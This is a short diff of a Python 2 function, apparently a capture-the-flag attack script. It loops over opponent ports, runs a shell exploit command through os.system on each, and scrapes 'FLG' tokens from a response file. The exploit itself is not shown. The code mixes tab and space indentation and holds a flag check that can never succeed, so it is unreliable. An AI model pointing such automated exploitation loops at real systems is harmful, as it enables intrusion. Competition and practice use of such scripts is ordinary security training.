@@ -67,21 +67,17 @@ def attack(service_id):
 		count = 0
 		for each in target_list:
 			try:
-                                #print " Flag id", each['flag_id'], "Team", each['hostname'], "Port", each['port']
-                                # If flag found, check if it already exists with our dictionary.
-                                print "port - ", each["port"]
-                                port = str(each["port"])
-                                os.system(exploit().format(port))
-                                with open("resp.txt", "r") as response:
-                                        temp = response.readlines()
-                                for each in temp:
-                                        line = each.split(' ')
-                                        flag = [s for s in line if "FLG" in s]
-#                               print flag
-                                for ele in flag:
-                                        if ele[-2:] == "\n":
-                                                ele = ele[:-2]
-#                                        print ele
+                print "port - ", each["port"]
+                port = str(each["port"])
+                os.system(exploit().format(port))
+                with open("resp.txt", "r") as response:
+                        temp = response.readlines()
+                for each in temp:
+                        line = each.split(' ')
+                        flag = [s for s in line if "FLG" in s]
+                for ele in flag:
+                    if ele[-2:] == "\n":
+                        ele = ele[:-2]
 					if ele not in flag:
 						flags[ele] = 1
 						temp_flags.append(ele)
